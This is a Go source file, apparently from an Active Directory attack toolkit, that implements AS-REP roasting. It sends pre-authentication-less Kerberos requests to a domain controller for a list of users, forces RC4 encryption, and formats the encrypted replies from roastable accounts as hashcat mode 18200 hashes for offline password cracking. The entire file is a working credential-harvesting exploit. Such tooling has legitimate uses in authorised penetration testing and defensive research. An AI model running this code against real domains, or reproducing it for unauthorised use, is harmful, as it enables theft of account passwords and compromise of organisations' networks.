package kerberos

import (
	"fmt"
	"strings"

	krbclient "github.com/jcmturner/gokrb5/v8/client"
	krbcfg "github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"

	"github.com/MKlolbullen/AD-plower/internal/config"
	"github.com/MKlolbullen/AD-plower/internal/workspace"
)

// ASREPResult is the crackable material produced by AS-REP roasting: a map of
// username -> hashcat-format hash (-m 18200).
type ASREPResult struct {
	RoastableUsers []string          `json:"roastable_users"`
	Hashes         map[string]string `json:"hashes"`
	Errors         map[string]string `json:"errors"`
}

// RunASREPRoast issues pre-auth-less AS-REQs for each supplied user. A user
// missing UAC_DONT_REQUIRE_PREAUTH will fail with PREAUTH_REQUIRED and be
// skipped; a roastable account returns an encrypted AS-REP whose cipher we
// format for hashcat mode 18200.
func RunASREPRoast(dc string, users []string) (*ASREPResult, error) {
	if config.Cfg.Domain == "" {
		return nil, fmt.Errorf("no domain configured")
	}
	res := &ASREPResult{
		Hashes: map[string]string{},
		Errors: map[string]string{},
	}

	realm := strings.ToUpper(config.Cfg.Domain)
	krb5conf := buildKrbConf(realm, dc)

	for _, user := range users {
		hash, err := roastOne(realm, user, krb5conf)
		if err != nil {
			res.Errors[user] = err.Error()
			continue
		}
		res.Hashes[user] = hash
		res.RoastableUsers = append(res.RoastableUsers, user)
	}

	workspace.Patch(func(r *workspace.ReconResults) {
		for u, h := range res.Hashes {
			r.ASREPHashes[u] = h
		}
	})
	workspace.Save("asrep", res)
	return res, nil
}

// roastOne builds an AS-REQ without pre-auth and parses the reply. A pre-auth-
// required error is a clean "not roastable" signal, not a tool failure.
func roastOne(realm, user string, c *krbcfg.Config) (string, error) {
	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
	sname := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)

	asReq, err := messages.NewASReq(realm, c, cname, sname)
	if err != nil {
		return "", fmt.Errorf("build AS-REQ: %w", err)
	}
	asReq.ReqBody.EType = []int32{
		etypeID.RC4_HMAC,
		etypeID.AES256_CTS_HMAC_SHA1_96,
		etypeID.AES128_CTS_HMAC_SHA1_96,
	}

	cl := krbclient.NewWithPassword(user, realm, "", c, krbclient.DisablePAFXFAST(true))
	rep, err := cl.ASExchange(realm, asReq, 0)
	if err != nil {
		return "", err
	}
	cipher := rep.EncPart.Cipher
	if len(cipher) == 0 {
		return "", fmt.Errorf("empty cipher")
	}
	// hashcat -m 18200: $krb5asrep$23$user@REALM:<first 16B of cipher>$<rest>
	return fmt.Sprintf("$krb5asrep$23$%s@%s:%x$%x", user, realm, cipher[:16], cipher[16:]), nil
}

func buildKrbConf(realm, dc string) *krbcfg.Config {
	c := krbcfg.New()
	c.LibDefaults.DefaultRealm = realm
	c.LibDefaults.DNSLookupKDC = dc == ""
	c.LibDefaults.UDPPreferenceLimit = 1 // force TCP, avoids MTU issues vs AD
	c.LibDefaults.DefaultTktEnctypes = []string{"rc4-hmac", "aes256-cts-hmac-sha1-96"}
	c.LibDefaults.DefaultTGSEnctypes = []string{"rc4-hmac", "aes256-cts-hmac-sha1-96"}
	c.LibDefaults.PermittedEnctypes = []string{"rc4-hmac", "aes256-cts-hmac-sha1-96"}
	c.LibDefaults.DefaultTktEnctypeIDs = []int32{etypeID.RC4_HMAC, etypeID.AES256_CTS_HMAC_SHA1_96}
	c.LibDefaults.DefaultTGSEnctypeIDs = []int32{etypeID.RC4_HMAC, etypeID.AES256_CTS_HMAC_SHA1_96}
	c.LibDefaults.PermittedEnctypeIDs = []int32{etypeID.RC4_HMAC, etypeID.AES256_CTS_HMAC_SHA1_96}
	if dc != "" {
		c.Realms = []krbcfg.Realm{{
			Realm:         realm,
			KDC:           []string{dc + ":88"},
			DefaultDomain: realm,
			KPasswdServer: []string{dc + ":464"},
			AdminServer:   []string{dc + ":749"},
		}}
	}
	return c
}
